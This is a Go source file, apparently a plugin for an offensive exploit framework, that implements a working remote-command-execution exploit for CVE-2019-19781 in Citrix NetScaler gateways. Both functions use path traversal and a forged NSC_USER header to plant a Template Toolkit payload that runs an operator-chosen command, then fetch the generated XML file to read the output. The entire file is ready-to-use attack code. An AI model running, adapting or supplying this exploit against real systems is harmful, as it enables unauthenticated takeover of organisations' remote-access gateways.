package exp_Citrix

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

type Exp_CVE_2019_19781 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2019_19781) xml_url(url string) {

}
func (self *Exp_CVE_2019_19781) Attack_cmd1() (expResult exp_model.ExpResult) {

	// 默认配置
	headers := self.GetInitExpHeaders()
	headers.Set("NSC_NONCE", "nsroot")
	host := strings.TrimRight(self.Params.BaseParam.Target, "/")

	// 构造payload
	target := host + "/vpn/../vpns/portal/scripts/newbm.pl"
	id := strings.ReplaceAll(goutils.UUIDv4(), "-", "")
	headers.Set("NSC_USER", "../../../netscaler/portal/templates/"+id)
	cmd := strings.ReplaceAll(self.MustGetStringParam("cmd"), "'", "\\'")
	payload := "url=http://example.com&title=" + id + "&desc=[% template.new('BLOCK' = 'print `" + cmd + "`') %]"

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 200 && strings.Contains(httpresp.Body, "parent.window.ns_reload") {
		headers.Set("NSC_USER", "nsroot")
		target = fmt.Sprintf("%s/vpn/../vpns/portal/%s.xml", host, id)
		httpresp = self.HttpGetWithoutRedirect(target, headers)
		if httpresp.Err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
		expResult.Result = httpresp.Body

	} else {
		expResult.Result = httpresp.Body
	}

	return
}
func (self *Exp_CVE_2019_19781) Attack_cmd2() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()
	headers.Set("NSC_NONCE", "nsroot")
	host := strings.TrimRight(self.Params.BaseParam.Target, "/")

	// 构造payload
	target := host + "/vpn/../vpns/portal/scripts/picktheme.pl"
	id := strings.ReplaceAll(goutils.UUIDv4(), "-", "")
	cmd := strings.ReplaceAll(self.MustGetStringParam("cmd"), "'", "\\'")
	payload := id + "[%template.new({'BLOCK'='print`" + cmd + "`'})%]"
	headers.Set("NSC_USER", "../../../netscaler/portal/templates/"+payload)

	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	if httpresp.Resp.StatusCode == 200 {
		headers.Set("NSC_USER", "nsroot")
		target = fmt.Sprintf("%s/vpn/../vpns/portal/%s.xml", host, url.PathEscape(payload))
		httpresp = self.HttpGetWithoutRedirect(target, headers)
		if httpresp.Err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
		expResult.Result = httpresp.Body

	} else {
		expResult.Result = httpresp.Body
	}

	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2019_19781{}, "exp_CVE_2019_19781.yml")

}
